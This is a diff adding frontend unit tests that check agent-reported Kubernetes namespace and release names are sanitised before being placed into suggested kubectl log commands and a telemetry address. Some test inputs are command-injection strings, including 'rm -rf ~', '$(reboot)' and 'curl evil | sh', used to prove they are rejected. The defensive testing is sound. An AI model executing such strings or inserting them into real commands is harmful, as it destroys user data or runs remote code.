@@ -1,7 +1,8 @@
 import { fireEvent, render, screen } from '@testing-library/react'
 import { describe, expect, test, vi } from 'vitest'
 import { DiagnoseDrawer } from '@/features/agents/components/DiagnoseDrawer'
-import { diagnoseAgent, diagnosisText } from '@/lib/diagnose'
+import { diagnoseAgent, diagnosisText, logCommand } from '@/lib/diagnose'
+import { otlpAddress } from '@/lib/exportHealth'
 import type { AgentDiagnostics, AgentExtras } from '@/lib/consent'
 import type { Agent } from '@/lib/types'
 
@@ -105,5 +106,24 @@ describe('DiagnoseDrawer', () => {
     render(<DiagnoseDrawer agent={agent()} extras={well} now={NOW} onClose={close} />)
     fireEvent.keyDown(document, { key: 'Escape' })
     expect(close).toHaveBeenCalled()
+  })
+})
+
+describe('what an agent says about where it runs, pasted into a command', () => {
+  test('a plain namespace and release are used as they are', () => {
+    expect(logCommand({ namespace: 'team-a', releaseName: 'ikhnos-2' })).toBe('kubectl -n team-a logs deploy/ikhnos-2 --tail=200')
+  })
+
+  test('anything that is not a plain name is replaced by the chart default, never pasted', () => {
+    expect(logCommand({ namespace: 'x; rm -rf ~', releaseName: '$(reboot)' })).toBe('kubectl -n ikhnos-system logs deploy/ikhnos-agent --tail=200')
+    const dx = diagnoseAgent(agent({ connected: false, namespace: 'x; curl evil | sh' }), well, NOW)
+    const commands = dx.findings.map((f) => f.command ?? '').join('\n')
+    expect(commands).not.toMatch(/[;|$`]/)
+    expect(commands).toContain('kubectl -n ikhnos-system get pods')
+  })
+
+  test('the address to copy does not take a namespace that is not a name', () => {
+    expect(otlpAddress('team-a').grpc).toBe('ikhnos-telemetry-cluster.team-a.svc:4317')
+    expect(otlpAddress('a b;c').grpc).toBe('ikhnos-telemetry-cluster.ikhnos-system.svc:4317')
   })
 })
